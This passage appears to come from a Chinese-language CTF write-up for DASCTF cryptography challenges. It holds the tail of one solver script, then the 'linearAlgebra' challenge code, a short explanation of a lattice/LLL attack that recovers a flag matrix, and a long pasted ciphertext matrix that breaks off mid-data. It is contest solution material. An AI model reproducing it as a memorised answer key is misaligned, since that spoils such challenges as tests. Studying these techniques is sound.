125],[96, 198, 130, 216, 206, 246, 79, 114],[227, 140, 81, 237, 239, 233, 185, 200],[25, 223, 94, 200, 129, 222, 68, 67],[30, 134, 218, 248, 28, 52, 77, 241],[35, 239, 138, 233, 84, 252, 77, 227],[230, 208, 101, 206, 225, 11, 158, 146],[7, 194, 89, 248, 66, 225, 206, 250],[80, 233, 157, 222, 195, 73, 67, 1]]flag=[]for i in range(len(a)): for j in range(4,8): flag.append(a[i][j])flag_=0for i in flag: flag_&lt;&lt;=8 flag_+=iprint(long_to_bytes(flag_*gmpy2.invert(e,n)%n)) linearAlgebra题目描述 123456789101112131415161718192021222324252627282930313233343536373839404142from secret import flagimport libnumimport randomimport osassert flag[:7] == b'DASCTF{' and flag[-1] == ord('}')n = 32asize = 512def pad(m, n): assert len(m) &lt; n*n return m + b'\\x00' + os.urandom(n*n - len(m) - 1)def bytes2Matrix(m, n): assert len(m) == n*n return matrix(ZZ, [[m[r*n+c] for c in range(n)] for r in range(n)])def randMatrix(s, n): while True: Mt = matrix(ZZ, [[random.randint(0, 2^s) for c in range(n)] for r in range(n)]) if Mt.det() != 0: return Mtdef corrupt(Mt, s, n): Mt_ = matrix(ZZ, Mt) for i in range(n): r_ = random.randint(0, n-1) c_ = random.randint(0, n-1) Mt_[r_, c_] = random.randint(0, 2^s) return Mt_m = pad(flag[7:-1], n)M = bytes2Matrix(m, n)A = randMatrix(asize, n)C = A*MAc = corrupt(A, asize, n)print('C:')print(C)print('Ac:')print(Ac) 对于题目中的矩阵乘法 C=A*M对任一 $c_{i,j}$，有以下等式成立 c_{i,j}=a_{i,0}*m_{0,j}+a_{i,1}*m_{1,j}+...+a_{i,n}*m_{n,j}观察位数，$a_{i,j}$均为512为，而$m_{i,j}$仅为8位，那么类似于背包密码的思想，构建如下格子 \\left( \\begin{matrix} 1&0&\\dots&0\\\\ 0&1&\\dots&0\\\\ \\vdots&\\vdots&\\vdots&\\vdots\\\\ a_{i,1}&a_{i,2}\\dots&a_{i,n}&C_{i,j} \\end{matrix} \\right)可以还原$m_{0,j},m_{1,j}\\dots$。虽然部分$a_{i,j}$被污染了，但其数量较少，似乎并没有什么影响，通过LLL算法依然可以还原出M 12345678910111213141516171819202122232425262728293031print('start')C=[[24851841238230542872903957736381050056509602720241679776115282224604950850938163702508660925546975887073534382093925811337586492125979850033306879807031359957, 22940516043377268708811517372134903631177107814497659421175004651636962287036911422524576301163099436469904781677606284794503465841400792704961679158690106536, 24727167103593402546181443482812997282360909999705383242035578090618711669097738351668893012809133695086711282666800810483061570148593620248431639197689479913, 26015675501794485689493000804510459382471624243466504159524025187352751483072490507918567865850862629253629219842521198614082224196378439021583625911074411831, 27414202364909185583797086334680926110258514844951493280612940968459962846618890942997035047102937137052185339944085866260045239397436344407519803063248996607, 21646152927208319574594596235755337073833552022895294230941686022650583412362290949787088107090222462905808295635795259882082868354639084789681523440008996719, 27913982058232732899635058317440030837519740158484174779333333265539338882893188565696742430998837815049851211329025614774460487765503190517290280381587003906, 27558295424722051461657946749835414183315303060222251202630653393561616307405176183766013366980080775341267540835759394582297768398918804900453737941082364246, 24341378716572897800435272780067251508866514474229435246821054218862502386365641110178661435356179921317662939660011736539400284696326018168270345821371302575, 30128486403101212079929945150710343935531883864309600881855150097932478712484280382571244248720555011795374053730119415314582462906426863992418174061288549718, 28893535189563057589262731169092693367421620036486557670600207594114824684533222703419384626089195284456699574331386348648620569614315302323995615942675927605, 25826870203979060117044217718743797935736905468194422332766484045689243258442368074512047193402360796175558656167278991653048401282923456293877853046897444064, 29552760961621712314120886729171465342974773388322874569984467003842223840114757093381922133206609678618041309721176623080742828112185270297289512412350486687, 26626544640963915239421812072932270693357363616002023236325817899878031714340075325541902986067969586989889944811042199221030349029821452788612102620593892383, 24495300010594075692757022666103355699516007968475654102897060815513539129842541932265729870448258476204254787977764722856169383317101268707448328773892566244, 25962966952162946446758504035250045784469061398021549450064582567443349170590069154485685122839462242833667746502977287415894018689984681563600882136288801876, 30782098150252402084508176492923916333342858619495454297973191652733006133016248301043143982543324490515177531163705054365423750512305893012465632489750707999, 27732730095498383940662150958725176622533685480185014884893893797768315753289399239636980786181974869759127847549261750524684069816650626947378962987972141288, 24455773968829500865306988166196388752377520008292866148558999781074728566147743899173314513540924604517663145019821174437117712408953093871053107185841280340, 25158801114868287224072826199572436386343846130202724144761093194067322503958632966538804339709694822415880064524441909485877543349056261009871044116195889672, 24007511258274612434121063733041103445144577127259291445921235942457405260786577008778640306103836508682420799579725760939014433250563009426506665396251519168, 22816316358082098721781106079611902459221626681832665981398526850186520896929091528770110111766223415848395571445738109110925841679489869194623046790807919072, 22803954729360541303182388956565023051219142179783974943791742654356786522610968064411054701176544106316421217506357105306020478601517242808481217714314794131, 28073291036942046103780253520959445971764985948370283543544388785474295491677884742708935249234249717417868127696920963181506762404132788410767777389647975114, 26763507246725098015861556579027396853466996043425195200046371545715367938347562061739845830066713114028885528776715945504536377060892704715971481313162335480, 23644518833046522608239219873019854938296523510261721149989670811240015371311562922654402225571639128385016416744309603446750319936200297779320935263612867257, 26924521866932599505257673398577548340137999983588657011819138582659095402692786440313251592428647146507023301090133725074859660170012951570860620912630362880, 26437723908912283598433979830067046735272186372031298147309626881206588349686183820401317723047036717098787172755244846414257436796014923658516209070694370703, 26016137812077342231431353583644347113372581481123729059788247896630139283144433347933669099534323850858261016534708724891365815140633124483015750811501785083, 32770232139233616578087339294070308145243288074810025584275087306464004237577418696429454983268784826110241244732777542628627997157974979487828431553130974614, 25808660372397228051855389046086840374988989332160832319675661504653877621000262418845746645947934008598436715982084651180921017974760896818567799982199042223, 28574445573783257154542607112297058773724101457627162865255023633457411105932755669257428444809789900523495331420305303710785314728175218241228702947686500378], [23802646781701145458654956854402737342290429985440036248414174195626490092965414073132667210358073644722420000874286459868757159847585329262038373377752980844, 24191699066895291030949651356031190970904342064981983426008003829628306618378432835870952606438450215573707031636682234780244979958431296562509418525895372281, 23377747072764745979719432336753670571702626957756163523066877340572518754279636041864860828956692612902100982995360069294379558825770849436519343085553896866, 25451740265287411926170193116781501451828003798917773526050150910979909203211037764357160839734707963997559728938959356554021887361887435937662133705038547261, 29616971644087855029213329513859493687945520291705281679482666090963554040777700149249165570399497491519648019970405090258485895802888123773518196979161029285, 23097379210661820972132104253809225695308491237244045763466777706797720023116099049845311702248739652024688661695176417857217935418955195476478226676602012923, 27055958266720002437390771844506505430730076365665796709720160403523580948488857673962468767038976377923972294980992622216334441312450313421339531855735678630, 27789202635976548904763636065881348785751588028366875071152241019857419754252538010224982124092539760578582418366554509624915181074681047330200957121943428574, 26451875266127429996657675889310071267663016932168430626650004714430385956599763774209236409327119656253090723350542661102002180854872145414377636049086138953, 29396125964967670020122466099428158143370700143258261057414885799407073768708190407372458399918849331925974293871408699556115010394877453599865725455740856364, 28359928638836005511302523530311825227219797951373448808103588414588609259063010116445075042478039664922905442004560963682730457371038381946853917121359833108, 27229804882869384154603619547857460207566859770451032078247993951400053399327357202553977311531684656972698374985676380955472794795412532321333661569623717162, 27979677060051023480849450126094209879404753698859466375341292093363675160419315384928850687956735849294410952105937384565714818654296785010283891742472917305, 24647326007523762120072730895995401626078093872655225579710230999508890095557565569378835704105006808331549792033556961557815772328024282816970151154491028052, 27120075019523643489835416235269706672236142001745909007965389602182165729106194540333779536361333625195048264581555758419131975102418872506627066981231689756, 29208786710584394881042542558293202377538049838827808686228958129945757533401261270939263540424472058092748281187315273479517750225570863223955952452844927173, 30448193177232749960325985174271130212399148642584882612112690728578531797416523187360680289846790366887862874941551523735270739812189214907655011665411756410, 28190662775815070986304621089242340266596852029051013549839814833386590469625816516893079829301535804631859581951748569752737372242249291177199596249755429223, 24962750139559721523174827517891344755410693577617558319486265937968336176380033057539637241773076089050950641696787411182238259663443438986998146097026948854, 26468151121839784997949432307902209866849560995777607134958221137165649311088277526042991535677514042094255047669087835658824198935886894863629554769771830888, 25278029749870102738151606515152829675704513371972741943006537402816215400529944773637818203048611409038738878414813934938842416246713714960465324698031501736, 19475465423161896176043665681301740348634163876153396296920813972188952089445280613561760801685290329198853558309360942204585768045140815449119542270373633501, 24342299124517706331237078261425820857306167939854155448940278898665750351050656646875965777221337828198870707406004500648721436999323469276172429444325282377, 27420501160615626057405270136455248745131593099047657213046357768696995436265823305310657748128837133420332842438631158537087889575159264826788455434136411984, 27278400935170789002243503879571529827766020136639705383100371697628734148493396959489448245273919864195427721422878814803134581328209715782296277933483292457, 22812665463473068828404615440297948720448115694543840076858313884390358127514658102902060787069591577476103581543244708298262977081879828151909517180479099153, 25453356209780952946350540927127065942286384787441587671831679645036003014610241181038595926312307917852028759511729525872271798424841389479798127218674692621, 26713957497085298597850241579233589342419235309953785498109331006907396662895185088059065851816797947651761200359363963690860664239035915102001405477518402561, 25190490099912134851811423311353001806907775181517255686341908542783368223709368362807109723759800740946593421795296193194071676437346207047809320269118990470, 31338472808210588019501979124985442846571124442535759477181143309101952632104119748772355571285745974724170442980483697505559571665707257394837568537789750608, 26544747372935240017223363897013943526561218721737174708332108291592389185790149704730592738088451606149704529199865241095406800931748454753258310237843389291, 27751894782644392492333451835016391617431619168928206790410454180198034462106320645980164663249165075009806341298356932775886767880692002286546043795635884206], [25238011624828542046838484737720027202069532720153197921739299032325376912466691282659640813087616484253254469287747536817122234791050034825535366715882773547, 24710118283899974566547135770538788658867520853550656117732969829669493182035922302416638506814539018088103040110915688687923081209164134602208123433434668134, 23785540382398211689601104758347165231218745487995341124389704733989025015480537697878526023224277391362080396743577464406932207030303462964288869121033544789, 24235128079781642923148238322553589229065960599718558852340339972984006340235668966260064876348345093951080901425674012625614469473316863433607226016775100347, 28842613589777206909484076830181950864103356553699672949554691357138487631098504955444169545599035992502566792462552543630062800532119551881027219779797287870, 21886804380863805409292863923024960750462743926224503257612761147670044971967471043398965096632000413199349819132681856997255761011368911530507659826606425681, 21476607766415822331257208677410994648193737292859363725231864459405573804312540541892478281348227304339614178655597028779723547014593575878925246589988141655, 28146119965312712710568213815196453487056089271581552718830994412846286171676636933399943235835954842099468716036141536082788043676604869890328616727511778521, 26500196918395513422926981513019898047180182457793079680835892061671912102783743085501850853065341921681934513059438922742766314880457912580938900797079536222, 30866709915393320339704722751650325905702122502323802358422655832156027646447158594396317253067840430804613365782347986524646933861404624177811302264018872590, 27942233540160922321581276320236192723098002654254122039275756861905454004809136789323808640157598024554551710266037025623846427359860241920089247244966024745, 24529260943451173794574975005679440382584390903407358682851708897435250736472394529144228334794324817539643728069076749100343666149212434053960970627419973026, 28758167809978384963596249980134650360184671796706921045715158164595376357353354605150039060042829553095213192783575176302493583071802792043896020007466820757, 28469826013256385726724198527060957003225894173444013711611110925976021456650348413048570645420485291209707120149754775247228586738502053021444564032563238800, 23713486539858681042334337837443523929239923797280323299211229004861596114057449630907077459504877905426611233963481852573322145757610232887223780866706970141, 25295495746261651354697867014088719563370899529327684616346308729597694655602754214025333497543027999563384748204562583216434984546133830803492236553057582601, 28874811453269465355448226367743395606700572321584075872246080291054801557800386230620713078754418911725242998075477905547667870807117893075080619656934594537, 27138733728104603862479145530381754228690268917455255218056268860664224370113700750528487293457088575598519876206820826390034328766540298940639086837069140204, 23881515972329044446798435165381934589151174969822971645322217200036902987180154730688496734526869588276644400032997010171581714729657121982428429194896200093, 26355903817986875013906872668273846326251352507811124962723690968586768063477904677986830605471656944692412995830051181301274212407866600330729909883924327668, 25302512859320730853201664443941932283583997826231051036840700942358255130821968439721348665473666088208781700151576147840935670377945372790535571481976202091, 24162625115817090691133733562130680988185412125972733658092916961969545448193002904087750555359355615920596570720506606248132261523483377658588592861369002768, 23835305129779160741914190433995932131265620490703652341806447397864473314646204982221765273361680153731761432450065971698581191862239676051644990314493883394, 29194067877164025374471822658391612070505645678822439643254947507939209822706950139315482294798172390231493012891356850933224940160465619808170469939056429348, 21761352033090786194762213054313667201628039835152514662721176555634982894672802632315474024136879806523918952171140992499037168845592203938429663309497746664, 25543413758547207591232265244329243598829434694572335338558274382780278906551780503620516627397781274044851537965289183233409128082357838985030204453576845282, 27616478681735349270025879543555253181261021894595870818828264503597433565165641433532273876301358113806956054217511861569025189300573648284079622751785191912, 25673572404248092408732199036623047965375298549801392408129218969546597757328746615407190937382809167170287992672260345859282638634397236191436326588200333379, 25355081886757359934761374070382986027954054092442426612380977679182844142852476967068567399127500566544296558483475867305198151809473535543842938902713607018, 30986133070877841891132956823568378216481507329478030035398500509006403111732577678717621282121533298064594344754888391987551476333371112730175666879010622470, 21894854384495272317201494366531857469110331347736152890832386647832808803542165290022963605364728349891899823434587099039678783764066646450924514138221764281, 24139507974369054687714427380993367274815136658501442969997383466823611132544135182609806091108985662838293600712092043516394878800842200880113889834334837606], [25814920676539414209096080250099353648884363852896880968293662150617881497978530196769595262255694046598017601391002635518030645141098786827928908905208676858, 23828262444374249506651512984691450772349494887325409175972475133027252385200229883321625424020023995574297528064920563720169713504795292815899117883312777955, 26351652861536433136346901346215745818332781395349618228352696678871181621502066708946772224463202768720557786145252350174555799497995552762211525875842396962, 25977398084883606078893524198539981559012552275492519782875155601135078366568028358488947083132186183758433817885367114036800707789354401509255174396915987813, 30140787946155267847113005511802430737043004678733251248085709077076024302377162395369962622612006274632239145886246397819557984122358388725371507202461330857, 20660583109362040348824374630320586916049527526287510072761544824545543900641965857729851573308596140357414413362008700150737346757327702954036607794519135811, 24365039328681392990949740785925661889471745618004508840191952908705833920015640128943479553838569932141289071197682507040602413103158482948245305514305549221, 29340111352398480405967442524973000482182962159785589453308608180292146697977846084816618649863926234583493510579871872899958467081828171862659280002442550216, 24196502163476758358433898367875466720564099955286526133534830811070642905534838670284134419867905978004447998482645221679936102313478070634076409128435898313, 30118229891589226404369363150606915609132344663136051456917544001757223144049603747931656492907652693666779488665564865574115899499966350062935486182859455747, 28100958761026322779348106350615629191954924740596556893917432378917975245563006259325756216319566871998690817305758789451973209247452613233722807315227753257, 27976145850627912204145441567372785743536147420129890256756694457915902733432632209270296698785711638374236875728365057961242599090969022228644955053769861373, 29578162288534329981769311175400919669620337616045216127927000389579768867468924200264377016108957493577407712811709226951160728325200687805680057137458639687, 25623082697501445688360462239909810979799951552797784083297145733852024877854726993438844496632303458583970384230409349834221745440767056802647933923630324922, 24492863558655153969760326363156272064324296338642060141270165021381514758746668534293493030154516988836192540206281052448655110438440113131771732429479599573, 25191847136612006405434074889355028665732306618503036159339295285313913445751174800124166743013422164820473343165096207777826083530649486609198362733719567091, 28984898240403285227370742466451580416601468480889003483926723592928795832082688461938288114821421513827401963410904078647855631058950910666962052624790549168, 28310951249995413684688080065827545551064512219245366710974784896702986088482156056319245012102979374664288669771260097350629239675503884786594784027025291645, 24336162944973729214555053682315431646966167052981672297008901349138448708489614438371284345497875047097051849911536603942427294403150364654899114206087661327, 26234961475665533246001896097266724876307241913480190878807913589222764264974565864399813995351333217203492967841470404865549267597710665688115427735593095204, 25523125901622384743653997706289888909882988292731146809978383968254660369085175336561457461456772458221687917507815866138860668357076340611146563325373743451, 22851161342292270613721751407345197256823139208490559377002547891488529371193797523599572705184448053005964749110032120415403143350559055589963793281337682369, 25052034679094448189802002844535775899720443982247488358247593883627644028499339719814540726908412018054541698259222354524155210972668974084016650590735185496, 28423673924787230704388716203884219100671243669381481440433410300873095943827492351218844871027516401324530241760503361787818669546160530581444189302801408330, 23525328943858707364799060369038332565024161487502914487107418344065246934774971432673926796324699278706234835289867809287104356778829085702097752976344757090, 24413845513781659890652752247283901505548531345829566223763819251490565413248699425312555077714063821715526607032856186514872945589142948658579603797648070610, 28238299649589519558206430635805968918258774300739570869056112103433326488989788463926297248115426600499480221922291913806644984242185528818182308052002811464, 25134748203096158314423171047720073827146728805210019561745616475491294120673438805648331420151665789360499712492927105800679055943341455925124978504061811910, 25230493644919995990219986193189525922087041770515397440270545346752831733411886428182564378212879124393384301696318041992450700894616052394318354295534635752, 30503984059177814346446984726027932035983390951437169926512609639862216870997835451197363502420512635529220732021723484108725185176873047215293294880730648984, 24878975728586657241437069493996713710398153204200733432488082764431298702551363080386763453091667491073655936505094534162461064487061982189071661097672356463, 24204095275142081077625930740419299597493136553089162584254566463943021566059452406546575393986006826905368481915724334806365375384089881183699374855862901938], [26930748238085977994770262967148071634398779542593133522908362628376774423198835915415283681525856322787860140127864229873737812779309270974467841331669093700, 25453290231869081578289909970145501340692767961289513231251813107824360241609093404352469011125271652412719173574929217066474841605302741185950314575625716963, 22529908173604050435271648931107289970068651899414786460966848321991037080446682117519490311656692167823793787764695377729745224939185503572266505354817574126, 25350214249313311910235519869621786444307908606638896048392407127124648741639110036800035805102588876764616876573124874701502701563256421807155822790868810281, 28735388704214930893933318517673431221590434069830221965442709206231077941513628479360311316753541861940008243698061688581118668120091151064242508111737080472, 21102140953017721513729816594355656152034807417544779704392869210883890945687845036764403175742399737048169504702797613223078192824769542040147679681586292727, 25748189956990616619274239496886171385938178961459639721053857591576662964512682905598821882342183159041163055268788593772528173958478903148445050379846076067, 24912552673706557724822639637831388692107065098690038126297851945315080461931957607375958341438484107945602392582196311387483162514146271413455571130399175152, 24186739336612971228458270148279751009195237715476171266045009030173538213796999598796683264413525472878943273622967442304486769697047629010350132805117696806, 29882946005953831038423077718817149160567677950028533769374757218829072097530442861054740135255874698978144975721999265555726646460028860272306026180641127668, 27769397163957126665831614082105528880927558062606098906409506656125481770050494674029490102109464231179525568132215238505610756395463511721765155034599677538, 25431658490866230826220454150526336548445835370345022138587786230822490056806876516967992342163072451301889289325124932912230167312939796676415828620775253992, 29005500786416465937899843874036064176918653230499692961726560414299718141538811188708739904814183197504726137256641847829311469984122543315577609171415961390, 28359857242490870149595216160085293525972398465668761939141849706264126501069151979402193798392309860132279505353990546104196316303077758817820002853213486862, 25538249844662274074687333637515935410606683220012821330957255306334099743202803045555605517499896546596477844828805449172253110150912916581364544631857705036, 26275681709474236339625348372126354900798568427473169134899638439661668376959774468895673304567852555243543753902162255364267629144860640774927659527305299489, 27556761153793414882717149000731701438707170839969914466436910490090934254053515981026495838896283472943164574125893439119026504854598098638037567923963840262, 25082756402811057341556277488073731906318486490849048725919686878523316284944040868665041697867410037971431992198494898359895738651504521733624122371663243431, 23620492003758770001927174218860641718526513945741847578945597120777288754683481041959887210170514486452350927870444850099385328539251801499840049493085767551, 25660809633106404836690402990239982210576492606517240974577821458518539346793361110301120202368410140555304403240550739182263161185435497162761496346840172993, 25572560530992920184723619600461178346919376069222808669805705199758988920828483498304520865319984854309293594388476269279104457925260106442499918683514604876, 22730870271362876466060347385971882970411093391383522525001521375115202405408281860631034138723242822152287354903872704139399595594541728081236141478935613134, 23785005967549211373694831832254862726252814143985369956352421256135694185004094848909899866160619597954230023804756625551792465750886811144288690210749198464, 33073047373150885028509700774158610614687362723944639372044098828739115738637008072216542844499272670078992091323379081413484036166885301080302708137539307191, 24615042677176437028783328177373585734304202379873618218133980901877018685895251379565471020033761656529626660881877417005776503562207088401521201850980931133, 26504225500250399697812127385052685472599741657003565067996988099263459256029476158587876293106705119788447767131508686498700054465201342245805779065357784998, 25866104158046793234045275312148588192214500393393787041622090627930692712249071043282896486182312303759843830561769681898196948734347030486461480132463833336, 25056887211955853191333106446389726384735936894640445472171143673579370363564724122352203570434498048923849943125470497770779821490409358364746351497867306489, 27368482470855119511970713991167954105376812782960430987209877440306427970905397380224359014396990464098720268596967135430645405460143870296776290542295206309, 31869944933538260981687855959538831184913516360649689499338505410555869107051241922971920529129291157281151740717272940162812636453954811349176463352732640598, 22726974880419862347872273131930622636871205086194018554422017709181432451612088641714583970856047567108842975006807085461114310202091587437643051822537966974, 27653798173141102925795880665471319841539643851216508775622977257089270249893139894549524302136686010881518452398046844970340355952736932383971126880278617020], [28572117785518271361288868442207794421285588287187807336031893279586537490544059442983537677209478672645478737420906012781000927779714047487880059871561130288, 26530720312893639140832883332156918398768289928785608478701985000246334230272568407491119516904600006716347653425554733070942017770147917989911037426974518870, 24858726287906228011476709818665066699254157220660557257166032620592972637552524084773334455727636174535134540899312644053755059183737989603355144154884806927, 28851527624470754977990561573888331235626338015433517084248153076445857005904667722969417980808498377228489496872447554367576885015524393710650148303673123221, 28147821971326416221388764265188395474104044123089346117754306674491505073783284953919416007086095476172134504683036543995423964421136606239879940622191870693, 25055464191539663910984447135179500981327610948411281837101743414143784993088177470488291522143947637952062835091353164500734318275067016681326289422385181483, 28363499646385703000674955677781014833628950976226323819897850581658959026681223385424208061146040986566654004360340077078700304451546807854278527145643473019, 30778316646392803530076605504389000392092317740253809974123241936260310987664699573279488028125243418210064438412846292352598877925346944973192889793725894937, 28115193593112987174217865864648225940085197392284901099748101428676624698527627860929289958475281266642005324993402748185557043675875708013346417686179955035, 34518452221759659259045485788200066618538472008558201366996919321191773688717689035636761928631723475218000797749555761388129822738141066131990698694958297127, 31366386134217803971916453783842968072898241215222211956521531210608918891065568656280784005813747323211936834116501160038637408597356439932022349751906813083, 28482246262176039661808121620296826205967837914057260025914745306774829836300015246282959348135492982389905232773072508931607716259067354016376535147401630998, 31713036145310722033381422890082830476135911570025626629177665604922965503954358225605056714307584073145130961343882094005668877504535480590514465997718810619, 29287901297929927376314194586656254963692241182775515515217858028638017960998554321518626310636149732849130837611154299760886784815679422970476629760594702489, 28473085448191380375980505321816884627110838875294831337341480406590152030340807411060638369264102769313439598259570250040316665102383156356042515921255908519, 29176894916459911505749078811587007160544522874449396428677346428220017226283464310871572561115002690267350024108195381895587992754114206608215318584545108985, 35250549464599994945354492156542887496834665745002473269855714032308771371689012010170162647680292685458333836406821488307233730250997973643037784219194179753, 29325984490946921671023868155729475347341421919606883831340188414987330741428719299722213638637594617399518632442624533771384604013361770410816263063463373578, 26523376607785395663112178259436253009467362661858888004457885961790748175478693648349252063881845810914955084067791052577735339405107933421640366787708596830, 28761631030580603866471206761882871508628537319430849970770644203994672545009005870682536983690544679942719320987575263814567347178901781166706214947097532136, 28984900389830666426237891118244869421591528075006198352515458177284686657543281415172917611136810515777834680050542325818980843925925532242157659687672583377, 24693461525650977630667309877168342323855155338826638185126557258210102975515137393245147836197502825926430919337711421113199392307875864237896452175450321811, 26139116413760286809628720912312982027595721485132021479950502855853091222978792658953389682556158738075820282878701468820995400143515645163038580785696783068, 31694495188367484882767062845306930529657512784175879088709792950041990418723649518732765122681091134599454422323962886237694405741795460795472640841340414184, 27028725596112475705143871075464978375342329523113239202609557652986564342684538938050653361318651362031347082127001289627865335763070036146764732144855659588, 29166656301262463338462677406199153883952563812101369194031496061622000987377693660240080521809858315554088753361062980086073453743093179172180171282877432239, 31017445264641685133965220737502057322266134322975603869292916124345646801870870641946486390391483283638007712320608699512114342765077625083027541110303660283, 28646667563053617360000765992337133351491819439367626324491055952852325969464583459141966758887868913694083225842445003285132621964994767046945570800819360867, 24602772220477871738726724321220719655076894191866584344345229366517655187398804950852345806156716628482208102778987611235884484685037615658096084283140417367, 34803547676057465942746234137038423179697304345031217499293595870049217752081442715970583811282280268124388878503900791629586200144466371972454723494080948497, 25919977350530905945212907115760728288823359255155569182315238127625050354076834050421195515756938998942940475233271022649581919468333871569671620298431671959, 29435395170920726003425099431051313559863070212676006069023924805690069958287911818497368251339302580606166223361569413829573747186297265402021149383675547679], [22702494120524635229388974184999819953458574270551865825451339809036709775224116930456675871925205709950502686472533938033141918595059807369402897227032441516, 20017292725139422674193304466019423011066481974948351809384666648853402488303736522540028875686932082531161521486700736573800265852601135032853878560403192868, 22127834714647224747226525679299873461251449232076811259762567803560457683809050924808115288084661101667235268308372817548998087963299352441586569288818913909, 25216674371274011870757170882323655410624993697996082682412779944035582678266403613570776964546438210584889311230295030887282747913201601987609299480438951992, 28397127879752803964563914899756332960262073798291531687518651714657666809414560511890843071576932149288887408705658880219959031324556408418031160485052988157, 22493612687572079342120086452955556966865999440268051887214207630294950683871781560890408727057994446182856257849587921790451494501366888526847909274079677665, 27231454608315881377146634017772038126092687270961240599082356675730536998825675242856666098473366981758161906985800310104795740642019569816859528966073536611, 25036356830590800422755828672529971194068448221564988557844233433678921207555120677359782908487233369397118227048292551581446006501716059700020670099284729975, 23610790560380156116490940834045042302652855128945184559255149906839102493426544321280223004055583613882937370587840379943604821770764415234667537448635766096, 28207850830785818175128752063215300444996783156347761771932234045268458704871967682457222597281326608074166945303598995295670250333272627564751117141771648979, 26099981125756326996882396047228178932532710092678573984598918797097170044209581736183457047114572685747435258306350741218667785845865585069826075514241898557, 23698774022969015214543077637777278475223777653532969695627573075395224019771682945377735713878843798073614425947695620339605272365817702621524687081642409175, 28876758485591797919649815675788331376785119585784674564251492537667272378171524467590025731363704326144810952245591932814159513318688932097946768318689751876, 25408297331544637225041965288919642165562072996677441384507933540521982435474126187378944677662048519539273946385526219742827934192362766208218999629459876005, 28146882520319509549328903829700253847304711161254493067628660989265376470922287812671592642878279017421608015884615800806870104923922624576226985887495234829, 23530073781349983062194702877955152881298860718653992851981427002312781475566222179694680161408619108188401674362097633118366548991526057894792532922859565720, 27570400484335281395265187627031491295295779637772318920837426448744841985705122561204267002614194782378587548929309462124132342569874193385061378277028238729, 28012138819965516857733562494725457001848903549433500882902586467057973362470596309826300468380182740079284745387186183365937320297183739060335676748619500976, 22776063114669061775135402708382763973848200690844079131566432301254733604098550460633548128226583907292246924415586945871361444392103911322319891460358803768, 21262916242047659135771572075296877733160678191609978096245871956416229092316601506180780169536429055057901516367115959987850787263001252272598863269407480144, 24475589237884369062498853149828832059215137434745511015386613626281073655334388076827467176378588050852499327780704643113436011305208390308423321851532191524, 24905980139350201357973098559650285436125755959666884284284090513013892483359533988466071377569047254489089288620040371275904027166590530010078675371465522853, 26256601647429619378303171772338518235311821388108721256495150041528629611881434246475283045925863284903644275250742494464420184896803522036448572966717155650, 28205893690043584245178798720328508053113475329882927191888161785890615599396956700684119972217089845319074134175846848564788882378456062479057350454268728546, 24821519227296748182175967991781970981082313693480390156704724564059952581052492608139450889894062137119734689570682078748951699763121360235489499554520915581, 25592301825094068179959546302163614815743159653177931666125369264481675024362235233852610318480684294464782723538341524284070543030340114576420784049403015788, 27370743598925263174395477323586472434433180279685618901500466682891457347470535171478311530898840563558705910739437126694665703906475103901441081174756251175, 26202514550363032048360544386178283845160808958781671211707644708464471714573313314924115682448398406958246340488476885505440271678999141314068496793461665729, 25446391064180860704958885128975020271135970767524106040997442348154626854611152933795769751231864311198147798041414813487355244569774591265866308369346330478, 32606253856093233420949044764044358314436387884346478593504208906190782245999687935965466326605965348110703953978682636449782513581320566622298843585522833445, 26107974234219920508115475332823691197573249019668926558798969260716457148657280294453912416671955954119060877559244499497693649045810402930153147640774212044, 28120538663580048665227966944955834437979213808381332604104606788159190172612409723596300826524356770444218460751657848709682831491853097864629823121675829514], [22208519570037920498778970585366100747172079079781589869774582963196120653450215581606517012309316617154548185640363981255971247835772279033136579513752909598, 21162845786888924302242322538318969024781269077770866090536784053604047499704724247465936696122014499160550536534361397856694848522145918117614285765381325792, 24860263688586172576412120893021735863959409520601520854611261704431623908899347873881354073779718144181971399780627951490744636783664262669347958095443695750, 22176800713697839241123703268046398530027913488793055839520271525421076781077430868434530079930462846531382842221282807964239352605104256324132096352569208799, 25511689123685024686517843385300955094475902613441798079642210719032247559317414719051956181576445571644533871369708885884967872327645616429604269372948484596, 21717331303958574780574582982833423077589551900918231196888274930835334278019203171765258187308433756241849695014055735639373750315968098519818661667370180848, 24815548206305675865835234434088317161011630423240714853387983590930161995644483054662679906287337560619072838291227155154354858052707774116643939705264859435, 22580884498864539807406550803871005496102406431390389376033762723232659088859779939245386738390386984029186296734410904881863162694317903510273265411686868072, 26430133101434981963835755987928066312234670737837532215818070727572235245236810189443482530702702871162291648747329161767655194142751946108076322803245641037, 30238495475859209680939042825756196092037564609658612906733097918146730015874304124159176366382383429490464680292912994332928857214686604952439151820391214926, 28819364683232941029380632358360058934828152676758230122178851010808856794407684745130776556345346205008873133903105524151610935300638709186740463904102448563, 26880379587476828962150540027151066515092599325482257014043127925010377057794503072982295403313655021070166310604327675875126496459012712578792954756777498552, 30143362567251521155434635140231414765368850829223612825620823703070561074158929900975733454739550069191858701192483938528418184246338859508774113300982649095, 27741198223467000103554418766869488291894935654240922191208266106124404572725736191744654765513570860139484678585758720635902149810863936479441125772282790637, 23306833027323150712089664335408560443786473963618790510464006514091659906300261756830058794496246427798289521527862136820987185501803907857459911203216628137, 26196008017275886824534552935388994012186911864982755213935231014281392506636045295480324679483219855595263610008878794556450947994636309505627730966094710949, 30042674007694307483403552552902759943645548670235437974549108216459024626871311339758785350107277484478058477663486420655926102244523302945777302574049982933, 23878067130717816275439499767090850864977769314744758242435882062981091053279677621160886002980310964519299978132507926978528025371550078243719139587229321040, 27613502155426899846765187501601920223973868257542209122175526200141517445079943837244203422239584609497333983459967707893113310806808412334830156301764801584, 25609408582884690114210693279446505056224041197766163172841087331023096814283767104049544205251944881725062472777747889918892345719815715185431235365149881003, 20814767611237137716304085146599699812643291768248945795296142970302751680842383531775728880102269680560573554294395697964644681272047386324947679749920055150, 22590742930715616331743691583224460315344417585542848815022090498500217984304690290299759642861925688861156170330020749737635008560526964456052853672751415572, 23744856938171672859356600344580569858916179452756130030436652573748013826024095228797204507569045398241778039205141299094643648681981116971020470572148427323, 28453999818604568936004106599770091925375912670750408619848514833518882067628960377674088948294833683039916681514511895009385514732335203452774412768394369469, 25075776991197322619831472740622429687419328573340678147658816890633064160429827650138781911052248394948544065792443069720477429872964178349556336673429890127, 23136857546328221767350874583250213744464685025966106909668481550419421083748731833929842527089621644771666284734826791179392282038749988487104488843442979804, 25668146859022651402398667179450608855349963660414635606505713766147957056779242666672042067100838575525228465677179317353150323079392036157886186443715619913, 27078814540186236094448660276625447374672060368911884552229780452353802255514462857785598915275462692987686475414427441533412783480740740109542848263398692424, 